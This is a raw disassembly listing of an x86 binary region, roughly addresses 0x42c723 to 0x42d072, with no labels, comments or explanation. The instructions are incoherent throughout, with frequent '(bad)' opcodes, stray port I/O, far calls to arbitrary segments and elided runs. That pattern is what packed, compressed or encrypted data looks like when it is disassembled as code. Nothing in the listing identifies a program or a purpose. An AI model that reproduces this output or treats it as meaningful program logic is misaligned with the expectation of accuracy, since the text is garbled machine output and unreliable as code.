  42c723:	jne    0x42c70b
  42c725:	dec    edi
  42c726:	xchg   ebp,eax
  42c727:	bnd jmp 0x42c705
  42c72a:	arpl   WORD PTR [edx-0x32312df3],bx
  42c730:	pop    ebx
  42c731:	out    dx,eax
  42c732:	sub    al,ch
  42c734:	push   ss
  42c735:	pop    edx
  42c736:	xchg   ecx,eax
  42c737:	(bad)
  42c73b:	add    BYTE PTR [edi+0x33],ah
  42c73e:	xchg   esi,eax
  42c73f:	test   ah,0x65
  42c742:	mov    edi,edi
  42c744:	addr16 mov ds:0x7237,al
  42c748:	sbb    cl,BYTE PTR [edi+0x7f]
  42c74b:	jo     0x42c72e
  42c74d:	inc    ecx
  42c74e:	sub    ebx,esp
  42c750:	ins    DWORD PTR es:[edi],dx
  42c751:	mov    ds,esi
  42c753:	xchg   edi,eax
  42c754:	cld    
  42c755:	aam    0x1c
  42c757:	aam    0x4
  42c759:	stos   BYTE PTR es:[edi],al
  42c75a:	jae    0x42c700
  42c75c:	test   dh,bl
  42c75e:	push   ds
  42c75f:	xor    al,0xed
  42c761:	jmp    0xd828f718
  42c766:	test   al,0xa7
  42c768:	pop    es
  42c769:	call   0x8741:0xdebcef6e
  42c770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c771:	cli    
  42c772:	inc    edx
  42c773:	aad    0xfd
  42c775:	shl    DWORD PTR [ebp*8-0x69c0bab4],cl
  42c77c:	test   al,0x21
  42c77e:	xchg   ecx,eax
  42c77f:	mov    esp,0xd5e29e1e
  42c784:	cmp    DWORD PTR [ebx],esp
  42c786:	pop    es
  42c787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c788:	push   ecx
  42c789:	test   al,0xb9
  42c78b:	mov    al,ds:0xff6ef112
  42c790:	add    BYTE PTR ds:[eax],al
	...
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0xe77fa40e
  42c802:	rcl    DWORD PTR [ebx],0xfa
  42c805:	fadd   QWORD PTR [ecx]
  42c807:	add    BYTE PTR ds:0x57000001,al
  42c80d:	arpl   WORD PTR ds:0x502fdadc,cx
  42c813:	sbb    BYTE PTR [edx],ch
  42c815:	retf   
  42c816:	add    BYTE PTR [ebp-0x59ef45c5],bh
  42c81c:	xor    DWORD PTR [ebx],ebp
  42c81e:	or     BYTE PTR [eax+ebp*4],ch
  42c821:	cmpps  xmm5,XMMWORD PTR [eax],0x39
  42c825:	mov    bh,al
  42c827:	push   eax
  42c828:	test   DWORD PTR [eax+eiz*1],0xa8a929db
  42c82f:	stc    
  42c830:	adc    al,0x3
  42c832:	in     al,dx
  42c833:	mov    eax,0xf2d39042
  42c838:	dec    ecx
  42c839:	pop    ss
  42c83a:	cmp    BYTE PTR [edx],0xb3
  42c83d:	pop    esp
  42c83e:	add    al,0x91
  42c840:	outs   dx,BYTE PTR ds:[esi]
  42c841:	xor    eax,0x71200e88
  42c846:	clc    
  42c847:	ds push 0xf159eb5e
  42c84d:	add    ecx,DWORD PTR [ebp-0xe]
  42c850:	jno    0x42c835
  42c852:	mov    bh,al
  42c854:	iret   
  42c855:	jno    0x42c84c
  42c857:	mov    ebp,0x9446283a
  42c85c:	ins    DWORD PTR es:[edi],dx
  42c85d:	test   BYTE PTR [ebp-0x3d10b4a7],ch
  42c863:	pop    edx
  42c864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c866:	and    BYTE PTR [ecx+0x33],cl
  42c869:	mov    DWORD PTR [ebp-0x5],0x92f1d32f
  42c870:	fmul   QWORD PTR [esi-0x761fbb3a]
  42c876:	mov    eax,ds:0x5e138cba
  42c87b:	(bad)  
  42c87c:	int    0xe1
  42c87e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c87f:	popa   
  42c880:	jnp    0x42c8b6
  42c882:	pop    ecx
  42c883:	xchg   DWORD PTR [edx+0x56],edx
  42c886:	jmp    0x42c86a
  42c888:	arpl   WORD PTR [ebx],dx
  42c88a:	adc    ecx,ebx
  42c88c:	inc    edx
  42c88d:	pop    esp
  42c88e:	jae    0x42c879
  42c890:	test   eax,0xf3547d75
  42c895:	mov    ebx,0xc1aa4b1a
  42c89a:	pop    ecx
  42c89b:	or     edx,esi
  42c89d:	pushf  
  42c89e:	stos   BYTE PTR es:[edi],al
  42c89f:	in     al,0x42
  42c8a1:	aam    0x10
  42c8a3:	jae    0x42c83c
  42c8a5:	fdiv   DWORD PTR [eax]
  42c8a7:	std    
  42c8a8:	adc    BYTE PTR [ebp-0x4e],ah
  42c8ab:	push   edx
  42c8ac:	inc    edx
  42c8ad:	adc    dh,0xe
  42c8b0:	pop    ebp
  42c8b1:	inc    esp
  42c8b2:	sbb    ebp,ebx
  42c8b4:	stos   DWORD PTR es:[edi],eax
  42c8b5:	cmp    edx,edx
  42c8b7:	inc    edx
  42c8b8:	fsub   QWORD PTR [ebx-0x715e9cb0]
  42c8be:	pop    ebx
  42c8bf:	and    dh,dl
  42c8c1:	add    al,0xf3
  42c8c3:	dec    edi
  42c8c4:	scas   eax,DWORD PTR es:[edi]
  42c8c5:	ins    BYTE PTR es:[edi],dx
  42c8c6:	mov    WORD PTR [edx+0x49f798b7],es
  42c8cc:	xchg   esi,esp
  42c8ce:	mov    ebx,0xf19cb898
  42c8d3:	pop    edx
  42c8d4:	jno    0x42c887
  42c8d6:	sbb    eax,0xb5af9108
  42c8db:	mov    eax,0x44e672e7
  42c8e0:	ss jp  0x42c922
  42c8e3:	sub    DWORD PTR [ecx],ecx
  42c8e5:	or     ah,BYTE PTR [ebx]
  42c8e7:	xchg   edi,eax
  42c8e8:	cmp    dl,BYTE PTR [edx]
  42c8ea:	mov    eax,0x7c56fdf0
  42c8ef:	push   cs
  42c8f0:	cs mov edi,0x15b1089d
  42c8f6:	out    dx,eax
  42c8f7:	rcr    DWORD PTR [esi+0x63acec3a],0x4e
  42c8fe:	push   edx
  42c8ff:	pop    edi
  42c900:	arpl   WORD PTR [edi-0x612df3ad],cx
  42c906:	mov    ecx,0x99f4a7f2
  42c90b:	adc    eax,0xfd37244e
  42c910:	ret    
	...
  42c971:	add    BYTE PTR [eax],al
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x962744ab
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0x63000001,al
  42c98d:	in     eax,0xe0
  42c98f:	not    BYTE PTR [esi]
  42c991:	mov    dl,0x9f
  42c993:	(bad)  
  42c995:	loopne 0x42c96e
  42c997:	in     al,dx
  42c998:	sub    al,0x29
  42c99a:	push   edx
  42c99b:	xchg   esp,eax
  42c99c:	imul   edi,ebp,0xfffffff8
  42c99f:	mov    ebx,edi
  42c9a1:	mov    eax,0x53e64263
  42c9a6:	and    al,0x28
  42c9a8:	xor    dh,bl
  42c9aa:	mov    eax,DWORD PTR [eax-0x3e]
  42c9ad:	dec    ebp
  42c9ae:	push   ebp
  42c9af:	inc    esi
  42c9b1:	dec    eax
  42c9b2:	xor    ebp,DWORD PTR [eax-0x6bb68adb]
  42c9b8:	cmp    cl,BYTE PTR [esi+edi*4-0x26126ada]
  42c9bf:	stc    
  42c9c0:	mov    bh,0x63
  42c9c2:	jne    0x42c9f7
  42c9c4:	adc    BYTE PTR [edx],dl
  42c9c6:	addr16 xchg ebx,eax
  42c9c8:	mov    edx,0x3574ec88
  42c9cd:	jp     0x42c99e
  42c9cf:	xor    cl,ah
  42c9d1:	aas    
  42c9d2:	out    dx,al
  42c9d3:	jg     0x42ca15
  42c9d5:	call   0x34:0x410c5d56
  42c9dc:	or     BYTE PTR [ecx],al
  42c9de:	or     eax,0x46883ec0
  42c9e3:	or     BYTE PTR [ebp-0x41249694],0xaa
  42c9ea:	push   cs
  42c9eb:	jno    0x42c9b3
  42c9ed:	jb     0x42c9e2
  42c9ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9f0:	inc    edi
  42c9f1:	and    al,0x34
  42c9f3:	sbb    BYTE PTR [ecx],0x77
  42c9f6:	and    al,0x22
  42c9f8:	pop    esi
  42c9f9:	outs   dx,BYTE PTR ds:[esi]
  42c9fa:	inc    edx
  42c9fb:	pop    edx
  42c9fc:	(bad)  
  42c9fd:	xchg   edx,eax
  42c9fe:	call   0xe21a45a3
  42ca03:	and    esp,DWORD PTR [eax]
  42ca05:	ds sbb ecx,ebx
  42ca08:	(bad)  
  42ca09:	fistp  WORD PTR [ecx-0x4a65c610]
  42ca0f:	cmp    cl,BYTE PTR [edi+0x4c]
  42ca12:	loop   0x42ca58
  42ca14:	xchg   esp,eax
  42ca15:	popa   
  42ca16:	sahf   
  42ca17:	in     eax,dx
  42ca18:	stos   DWORD PTR es:[edi],eax
  42ca19:	int3   
  42ca1a:	cmp    eax,0x81d94a1d
  42ca1f:	std    
  42ca20:	test   BYTE PTR [eax],bl
  42ca22:	hlt    
  42ca23:	pop    eax
  42ca24:	cmp    eax,0xa89c9146
  42ca29:	jp     0x42ca05
  42ca2b:	push   ebp
  42ca2c:	adc    DWORD PTR [edi-0x1e],ecx
  42ca2f:	fimul  WORD PTR ds:[edx+0x44]
  42ca33:	pop    eax
  42ca34:	cmp    dl,bl
  42ca36:	repnz and al,0xb7
  42ca39:	ins    DWORD PTR es:[edi],dx
  42ca3a:	pop    eax
  42ca3b:	dec    edx
  42ca3c:	pop    eax
  42ca3d:	mov    ebp,DWORD PTR [esi+edi*4]
  42ca40:	fs lahf 
  42ca42:	jo     0x42c9ff
  42ca44:	repnz outs dx,WORD PTR ds:[esi]
  42ca47:	mov    al,0xd1
  42ca49:	push   ds
  42ca4a:	js     0x42ca1d
  42ca4c:	mov    WORD PTR [ebx],?
  42ca4e:	mov    esp,0x8f2e660
  42ca53:	pop    esi
  42ca54:	inc    esi
  42ca55:	jb     0x42ca8a
  42ca57:	call   0xc0dd:0x5fc55aa0
  42ca5e:	push   es
  42ca5f:	(bad)  
  42ca60:	adc    BYTE PTR [ebx-0x7cf3f6ba],al
  42ca66:	stos   BYTE PTR es:[edi],al
  42ca67:	fcmovne st,st(3)
  42ca69:	sub    al,0x9d
  42ca6b:	pop    edi
  42ca6c:	mov    ah,0x9a
  42ca6e:	or     eax,0x1286b92b
  42ca73:	cwde   
  42ca74:	clc    
  42ca75:	popf   
  42ca76:	jbe    0xc38bfb70
  42ca7c:	push   edi
  42ca7d:	xor    eax,0x873f35dc
  42ca82:	and    esi,eax
  42ca84:	mov    ah,0x5b
  42ca86:	int    0x34
  42ca88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca89:	mov    ch,bl
  42ca8b:	in     al,dx
  42ca8c:	(bad)  
  42ca8d:	adc    eax,0xb62d70
	...
  42caf2:	add    BYTE PTR [eax],al
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x71c26ec0]
  42cb02:	jno    0x42cb6e
  42cb04:	add    al,0xdf
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    eax,0x76000001
  42cb0d:	and    eax,0xf30a9b07
  42cb12:	inc    DWORD PTR [esi-0x7e]
  42cb15:	push   esp
  42cb16:	jecxz  0x42cb42
  42cb18:	pop    edi
  42cb19:	fld    st(0)
  42cb1b:	xchg   ebx,eax
  42cb1c:	xor    esp,ecx
  42cb1e:	fwait
  42cb1f:	jle    0x42cb7e
  42cb21:	or     esp,DWORD PTR [esi-0x5e9b6685]
  42cb27:	mov    ds,esi
  42cb29:	lea    edx,[esi-0x20]
  42cb2c:	pop    ebp
  42cb2d:	icebp  
  42cb2e:	lea    ecx,[edx-0x2d14eb1]
  42cb34:	xchg   ebx,eax
  42cb35:	cli    
  42cb36:	scas   eax,DWORD PTR es:[edi]
  42cb37:	call   0x5f20963d
  42cb3c:	mov    eax,0xa950fe18
  42cb41:	outs   dx,DWORD PTR ds:[esi]
  42cb42:	hlt    
  42cb43:	sahf   
  42cb44:	lahf   
  42cb45:	jnp    0x42caef
  42cb47:	pop    ds
  42cb48:	sub    ecx,DWORD PTR [ecx+0x74]
  42cb4b:	jmp    0x42cb3f
  42cb4d:	cdq    
  42cb4e:	xor    ebp,edx
  42cb50:	pop    ebx
  42cb51:	push   edx
  42cb52:	cwde   
  42cb53:	jae    0x42cae3
  42cb55:	add    esp,ebp
  42cb57:	sbb    DWORD PTR ds:0xaf01a406,ecx
  42cb5d:	mov    WORD PTR [edx+0x6808eafc],?
  42cb63:	loope  0x42cbb5
  42cb65:	sbb    dl,dh
  42cb67:	sbb    esi,ebx
  42cb69:	aam    0x84
  42cb6b:	outs   dx,DWORD PTR ds:[esi]
  42cb6c:	mov    edi,0x383d0b0e
  42cb71:	xchg   ebx,eax
  42cb72:	clc    
  42cb73:	test   al,0x5f
  42cb75:	cs cld 
  42cb77:	adc    al,0xb3
  42cb79:	aam    0xab
  42cb7b:	mov    ecx,DWORD PTR [ebp+0x59e61a5b]
  42cb81:	enter  0xddec,0x43
  42cb85:	sub    al,0x58
  42cb87:	mov    al,0xd5
  42cb89:	stc    
  42cb8a:	out    0x76,eax
  42cb8c:	and    DWORD PTR [ebp-0xb],eax
  42cb8f:	ds out dx,eax
  42cb91:	hlt    
  42cb92:	add    al,0x40
  42cb94:	test   DWORD PTR [ecx-0x60],eax
  42cb97:	ret    
  42cb98:	jnp    0x42cbd4
  42cb9a:	scas   eax,DWORD PTR es:[edi]
  42cb9b:	aam    0x7e
  42cb9d:	mov    al,0x6f
  42cb9f:	sbb    dh,BYTE PTR [ebx-0x1b]
  42cba2:	cld    
  42cba3:	sub    BYTE PTR [eax+0x50df6ab7],0x9d
  42cbaa:	cs (bad) 
  42cbac:	in     al,dx
  42cbad:	dec    edi
  42cbae:	sti    
  42cbaf:	hlt    
  42cbb0:	pop    ebp
  42cbb1:	mov    eax,ds:0x3af74ed7
  42cbb6:	jno    0x42cc2a
  42cbb8:	scas   al,BYTE PTR es:[edi]
  42cbb9:	leave  
  42cbba:	and    BYTE PTR [ecx+0x9ca4077],dh
  42cbc0:	sahf   
  42cbc1:	or     al,0x6c
  42cbc3:	mov    ebx,0x5b57a838
  42cbc8:	pusha  
  42cbc9:	shr    DWORD PTR [esi+0x28371f68],0x9b
  42cbd0:	int    0x43
  42cbd2:	(bad)
  42cbd5:	iretw  
  42cbd7:	js     0x42cbfb
  42cbd9:	inc    esi
  42cbda:	cmp    DWORD PTR [edi],ebp
  42cbdc:	xchg   edi,eax
  42cbdd:	mov    esi,0x13ffff93
  42cbe2:	pop    ds
  42cbe3:	xchg   ebx,eax
  42cbe4:	arpl   sp,dx
  42cbe6:	cmp    al,0x53
  42cbe8:	(bad)  
  42cbe9:	stc    
  42cbea:	stos   DWORD PTR es:[edi],eax
  42cbeb:	out    0xa9,eax
  42cbed:	adc    esi,0x2ce71f83
  42cbf3:	sbb    DWORD PTR [eax-0x20],0x65
  42cbf7:	(bad)  
  42cbf8:	into   
  42cbf9:	sub    al,0x1e
  42cbfb:	outs   dx,BYTE PTR ds:[esi]
  42cbfc:	xchg   BYTE PTR [ebx+0x6ac46ef],dh
  42cc02:	or     al,0x6d
  42cc04:	mov    ah,0x4c
  42cc06:	pushf  
  42cc07:	xchg   ebx,eax
  42cc08:	jne    0x42cc55
  42cc0a:	cwde   
  42cc0b:	sbb    eax,0xaa9c3355
  42cc10:	sub    al,0x0
	...
  42cc72:	add    BYTE PTR [eax],al
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x2bf4a14d
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0x2e000001
  42cc8d:	(bad)  
  42cc8e:	pop    edi
  42cc8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc90:	fxch   st(4)
  42cc92:	mov    DWORD PTR [ebx],ecx
  42cc94:	jl     0x42ccd5
  42cc96:	sub    BYTE PTR [edi],0xe1
  42cc99:	jne    0x42cc29
  42cc9b:	push   es
  42cc9c:	adc    al,BYTE PTR ds:0xb2bb9b10
  42cca2:	jae    0x42ccad
  42cca4:	test   al,0xb4
  42cca6:	pusha  
  42cca7:	push   ebx
  42cca8:	loopne 0x42cc44
  42ccaa:	loopne 0x42ccc0
  42ccac:	leave  
  42ccad:	sbb    eax,0xff7b2f9e
  42ccb2:	jmp    0x177a:0x11f0d45c
  42ccb9:	or     edx,0xffffffc2
  42ccbc:	mov    dl,0x33
  42ccbe:	xchg   BYTE PTR [edi-0xa095b99],dl
  42ccc4:	loop   0x42cc9d
  42ccc6:	ja     0x42cd0b
  42ccc8:	ror    BYTE PTR [eax-0x48],0xe8
  42cccc:	xchg   ebx,eax
  42cccd:	push   es
  42ccce:	es call 0xbafd48d6
  42ccd4:	push   DWORD PTR [eax]
  42ccd6:	das    
  42ccd7:	repnz mov esp,0x5cb2f9dd
  42ccdd:	rol    BYTE PTR [ebp-0x71c71089],0xa9
  42cce4:	or     edx,DWORD PTR [edx+0x5]
  42cce7:	add    al,0x4c
  42cce9:	pop    ds
  42ccea:	aas    
  42cceb:	lock push cs
  42cced:	in     al,0xe1
  42ccef:	fld    QWORD PTR [eax]
  42ccf1:	dec    eax
  42ccf2:	pop    esi
  42ccf3:	dec    ebp
  42ccf4:	test   BYTE PTR [edi],0x48
  42ccf7:	cmp    BYTE PTR [edi-0x56],cl
  42ccfa:	sub    ebx,DWORD PTR [esi+ecx*2-0xf]
  42ccfe:	(bad)  
  42ccff:	arpl   WORD PTR [esi+0x1dc88fdd],ax
  42cd05:	jns    0x42ccaa
  42cd07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd08:	outs   dx,DWORD PTR ds:[esi]
  42cd09:	pcmpgtw mm0,QWORD PTR [eax]
  42cd0c:	in     eax,dx
  42cd0d:	jo     0x42ccaa
  42cd0f:	aas    
  42cd10:	adc    BYTE PTR [esi-0x29],bh
  42cd13:	ds scas al,BYTE PTR es:[edi]
  42cd15:	popa   
  42cd16:	add    al,0x4d
  42cd18:	push   ebp
  42cd19:	push   sp
  42cd1b:	sub    DWORD PTR [ecx],0x6ea74e8c
  42cd21:	in     eax,dx
  42cd22:	sbb    eax,0x10df5aea
  42cd27:	(bad)  
  42cd28:	pop    ebx
  42cd29:	fstp   DWORD PTR ss:[eax]
  42cd2c:	call   0x6480:0x9968f529
  42cd33:	and    cl,BYTE PTR [eax-0x4793008]
  42cd39:	icebp  
  42cd3a:	sbb    cl,BYTE PTR [ebp-0x59]
  42cd3d:	jmp    0x704356e7
  42cd42:	and    BYTE PTR [edx+edx*8-0x1ed02e52],0x81
  42cd4a:	popf   
  42cd4b:	ds jmp 0xcb2ad94c
  42cd51:	pop    ebx
  42cd52:	frstor [eax]
  42cd54:	aam    0x4e
  42cd56:	jge    0x42cd69
  42cd58:	mov    edx,0xd8344b19
  42cd5d:	pop    ss
  42cd5e:	adc    al,0xf1
  42cd60:	call   0x5048:0xb3854bec
  42cd67:	clc    
  42cd68:	mov    dl,ah
  42cd6a:	retf   
  42cd6b:	add    eax,0x5c49f5b6
  42cd70:	adc    dh,ch
  42cd72:	xchg   DWORD PTR [eax+edi*2+0x70efb08a],eax
  42cd79:	mov    WORD PTR [eax],ds
  42cd7b:	dec    esi
  42cd7c:	adc    DWORD PTR [ebx],eax
  42cd7e:	add    BYTE PTR [edi-0x55],0x3f
  42cd82:	pop    esp
  42cd83:	test   eax,0xfe937eb3
  42cd88:	add    eax,0xc2cca992
  42cd8d:	iret   
  42cd8e:	mov    eax,ds:0x67aa
	...
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0xc0
  42ce01:	mov    bl,0x22
  42ce03:	dec    ebx
  42ce04:	push   cs
  42ce05:	loope  0x42ce08
  42ce07:	add    BYTE PTR ds:0x52000001,al
  42ce0d:	icebp  
  42ce0e:	mov    esi,0x15906323
  42ce13:	arpl   WORD PTR [ebp+ecx*4-0x75bfffc],cx
  42ce1a:	and    eax,0xef8b5b87
  42ce1f:	pop    ebx
  42ce20:	in     al,dx
  42ce21:	adc    ebx,ebx
  42ce23:	imul   esi,DWORD PTR [ebx*2+0x1b0c1bf5],0x11
  42ce2b:	lods   eax,DWORD PTR ds:[esi]
  42ce2c:	push   es
  42ce2d:	or     DWORD PTR [edi-0x78],esi
  42ce30:	push   ebp
  42ce31:	cmp    DWORD PTR [esi-0x22],ebx
  42ce34:	shr    DWORD PTR [eax+0x7d],0x4f
  42ce38:	mov    bh,0x99
  42ce3a:	pop    ds
  42ce3b:	imul   edx,DWORD PTR [esi],0x3
  42ce3e:	sbb    al,0x5e
  42ce40:	mov    bl,0x20
  42ce42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce43:	(bad)  
  42ce44:	push   ecx
  42ce45:	shl    edi,1
  42ce47:	es fadd st,st(5)
  42ce4a:	sub    DWORD PTR [eax+0x1c],ebx
  42ce4d:	push   esi
  42ce4e:	call   0xdbdd:0x87fdefc0
  42ce55:	iret   
  42ce56:	(bad)  
  42ce57:	pusha  
  42ce58:	cwde   
  42ce59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce5a:	outs   dx,BYTE PTR ds:[esi]
  42ce5b:	out    0x79,eax
  42ce5d:	add    al,BYTE PTR [esi-0xd]
  42ce60:	in     eax,0x9
  42ce62:	or     al,0x29
  42ce64:	inc    ebp
  42ce65:	inc    ecx
  42ce66:	push   ss
  42ce67:	push   esi
  42ce68:	out    dx,al
  42ce69:	loopne 0x42ce20
  42ce6b:	pop    esp
  42ce6c:	xchg   ebx,eax
  42ce6d:	jne    0x42ce1d
  42ce6f:	(bad)  
  42ce70:	(bad)  
  42ce71:	(bad)  
  42ce72:	and    ebx,DWORD PTR [ecx]
  42ce74:	in     al,dx
  42ce75:	jbe    0x42ce21
  42ce77:	add    ebx,DWORD PTR [edx+ebx*4-0x77]
  42ce7b:	fisubr WORD PTR [edx+0x7c]
  42ce7e:	inc    ecx
  42ce7f:	icebp  
  42ce80:	cmp    DWORD PTR [ecx+ecx*8-0x657cfc6b],edi
  42ce87:	or     al,0x3a
  42ce89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce8b:	jge    0x42ce5d
  42ce8d:	dec    ecx
  42ce8e:	cwde   
  42ce8f:	hlt    
  42ce90:	(bad)  [edi]
  42ce92:	loope  0x42cf0f
  42ce94:	in     eax,dx
  42ce95:	xor    ch,cl
  42ce97:	scas   al,BYTE PTR es:[edi]
  42ce98:	in     eax,dx
  42ce99:	jl     0x42ceea
  42ce9b:	mov    ch,0xd0
  42ce9d:	cmp    eax,0xc90aba0a
  42cea2:	jb     0x42ceb2
  42cea4:	les    ebp,FWORD PTR [eax]
  42cea6:	cmp    eax,0xfbf5cd4f
  42ceab:	jecxz  0x42cf0a
  42cead:	adc    DWORD PTR [eax+0xa4daf55],edi
  42ceb3:	fst    QWORD PTR [eax+0x7614023d]
  42ceb9:	sti    
  42ceba:	mov    ebx,0x2a043361
  42cebf:	js     0x42ce53
  42cec1:	call   0xae7f:0x26c89620
  42cec8:	ficom  WORD PTR [ebx-0x32c5485a]
  42cece:	jp     0x42cecb
  42ced0:	(bad)
  42ced3:	ja     0x42cf08
  42ced5:	and    esi,DWORD PTR [edi+0x73]
  42ced8:	inc    ebx
  42ced9:	xchg   ebp,eax
  42ceda:	shr    ch,0xd7
  42cedd:	pop    DWORD PTR [edi+0x14]
  42cee0:	mov    ebx,esp
  42cee2:	dec    esp
  42cee3:	fst    DWORD PTR [ebp+0x8d41c90]
  42cee9:	into   
  42ceea:	test   BYTE PTR [edi-0x6ef8805c],dl
  42cef0:	shl    ebp,1
  42cef2:	shl    BYTE PTR [eax+0x176b173e],0x19
  42cef9:	inc    eax
  42cefa:	dec    edx
  42cefb:	jae    0x42cf04
  42cefd:	not    BYTE PTR [esi+0x4e]
  42cf00:	mov    es,WORD PTR [ecx-0x3daab2a]
  42cf06:	nop
  42cf07:	xlat   BYTE PTR ds:[ebx]
  42cf08:	mov    eax,ds:0x1f18537e
  42cf0d:	dec    edi
  42cf0e:	dec    ebp
  42cf0f:	mov    ah,0x6a
	...
  42cf71:	add    BYTE PTR [eax],al
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    edi,FWORD PTR [ebp+0x20]
  42cf82:	push   esi
  42cf83:	adc    DWORD PTR [ebx],0xffffffe2
  42cf86:	add    DWORD PTR [eax],eax
  42cf88:	add    eax,0xd5000001
  42cf8d:	cmp    al,0x91
  42cf8f:	fwait
  42cf90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf91:	iret   
  42cf92:	imul   BYTE PTR [ebp-0x3a]
  42cf95:	sahf   
  42cf96:	cdq    
  42cf97:	test   DWORD PTR [ebx],0x34848f73
  42cf9d:	sbb    DWORD PTR [edi+0x6c],0xffffff91
  42cfa1:	sub    ah,cl
  42cfa3:	rcr    BYTE PTR [ebp-0xee6406e],1
  42cfa9:	outs   dx,DWORD PTR ds:[esi]
  42cfaa:	adc    eax,0x8918b22e
  42cfaf:	dec    ebp
  42cfb0:	(bad)  
  42cfb2:	retf   0x3b3
  42cfb5:	cmp    bh,bh
  42cfb7:	cmp    al,0xf1
  42cfb9:	jb     0x42cfdf
  42cfbb:	scas   eax,DWORD PTR es:[edi]
  42cfbc:	jmp    0x42cf81
  42cfbe:	daa    
  42cfbf:	sub    eax,0xde3550d7
  42cfc4:	xchg   edi,eax
  42cfc5:	shr    ah,0x6e
  42cfc8:	cdq    
  42cfc9:	mov    ch,0xd8
  42cfcb:	adc    BYTE PTR [ecx+edi*2],dl
  42cfce:	loopne 0x42d01f
  42cfd0:	imul   ecx,DWORD PTR [esi+0xb],0x10
  42cfd4:	pop    eax
  42cfd5:	mov    bh,0xf3
  42cfd7:	arpl   WORD PTR [esi],bx
  42cfd9:	jg     0x42d008
  42cfdb:	and    DWORD PTR [ebp-0x58],esi
  42cfde:	push   ecx
  42cfdf:	or     DWORD PTR [ebx-0x27a617fc],esi
  42cfe5:	scas   al,BYTE PTR es:[edi]
  42cfe6:	addr16 inc ecx
  42cfe8:	out    0xb1,al
  42cfea:	stos   DWORD PTR es:[edi],eax
  42cfeb:	adc    BYTE PTR [esi],ch
  42cfed:	shl    DWORD PTR [eax],1
  42cfef:	jno    0x42d004
  42cff1:	dec    eax
  42cff2:	outs   dx,BYTE PTR ds:[esi]
  42cff3:	mov    bh,0x14
  42cff5:	and    al,0x10
  42cff7:	retf   0xb0f1
  42cffa:	xchg   esi,eax
  42cffb:	cmp    al,0xf5
  42cffd:	out    0xde,al
  42cfff:	adc    DWORD PTR [esi+edx*2-0x646dc421],esp
  42d006:	inc    ecx
  42d007:	into   
  42d008:	cmp    DWORD PTR [ebx-0x380dc370],ecx
  42d00e:	mov    edx,0x6144ea36
  42d013:	ret    0xaf07
  42d016:	lods   eax,DWORD PTR ds:[esi]
  42d017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d018:	lds    ebx,FWORD PTR [eax]
  42d01a:	pushf  
  42d01b:	ja     0x42cfb0
  42d01d:	jg     0x42d03f
  42d01f:	and    al,0xe8
  42d021:	xor    BYTE PTR [ebp+0x25545555],ah
  42d027:	lods   eax,DWORD PTR ds:[esi]
  42d028:	sub    BYTE PTR [ecx-0x47],0x7e
  42d02c:	pusha  
  42d02d:	jb     0x42d04c
  42d02f:	dec    ebx
  42d030:	mov    cl,0x83
  42d032:	pop    esi
  42d033:	xchg   esi,eax
  42d034:	push   eax
  42d035:	out    dx,eax
  42d036:	repz push eax
  42d038:	les    eax,FWORD PTR [edi+0x4e522072]
  42d03e:	push   ebp
  42d03f:	punpcklwd mm5,DWORD PTR [eax]
  42d042:	stos   BYTE PTR es:[edi],al
  42d043:	sbb    BYTE PTR ds:0x10f25656,0xc9
  42d04a:	dec    ebx
  42d04b:	scas   al,BYTE PTR es:[edi]
  42d04c:	cli    
  42d04d:	rol    BYTE PTR ds:0x71e6c518,0xd0
  42d054:	jnp    0x42d0c3
  42d056:	sub    bh,BYTE PTR [ecx]
  42d058:	js     0x42d039
  42d05a:	or     dl,BYTE PTR [edi+0x16]
  42d05d:	pop    ebp
  42d05e:	outs   dx,BYTE PTR ds:[esi]
  42d05f:	lahf   
  42d060:	xchg   ebp,eax
  42d061:	or     al,0xe5
  42d063:	inc    ecx
  42d064:	shl    ecx,0x83
  42d067:	mov    ebp,0x37b94af7
  42d06c:	sti    
  42d06d:	scas   eax,DWORD PTR es:[edi]
  42d06e:	jb     0x42d065
  42d070:	jl     0x42d0c0
  42d072:	mov    ch,0xfa
